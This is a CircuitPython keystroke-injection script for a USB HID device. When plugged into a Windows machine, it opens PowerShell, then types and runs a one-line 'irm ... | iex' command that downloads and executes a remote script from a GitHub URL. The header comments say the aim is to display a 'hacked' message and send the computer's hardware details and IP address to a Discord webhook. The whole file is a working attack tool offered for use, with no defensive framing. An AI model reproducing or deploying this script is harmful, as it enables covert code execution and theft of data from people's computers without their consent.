# Purpose:
# Minimize all windows, open Notepad, and type "YOU ARE BEEN HACKED"
# Then, use PowerShell to send computer hardware information/IP address via Discord webhook
# Finally, close all PowerShell windows
# !! Note !! This script will automatically switch to another language input method before opening PowerShell, so if you have multiple input methods, it may cause errors.
# Remember to put your own webhook URL in line 65.

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
mouse = Mouse(usb_hid.devices)

def open(word):
    kbd.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.5)
    layout.write(word, delay = 0.1)
    time.sleep(0.5)
    kbd.send(Keycode.ENTER)
    time.sleep(1)

time.sleep(2)

kbd.send(Keycode.SHIFT)
time.sleep(0.1)
kbd.release(Keycode.ALT)
time.sleep(0.5)

open("powershell")
time.sleep(1)
powershell_script = '''
irm https://raw.githubusercontent.com/956zs/HID-Script/refs/heads/main/all | iex
'''
for line in powershell_script.splitlines():
    layout.write(line, delay = 0.01)
    kbd.send(Keycode.ENTER)
    time.sleep(0.3)
time.sleep(1)
layout.write("exit", delay = 0.01)
time.sleep(0.1)
kbd.send(Keycode.ENTER)
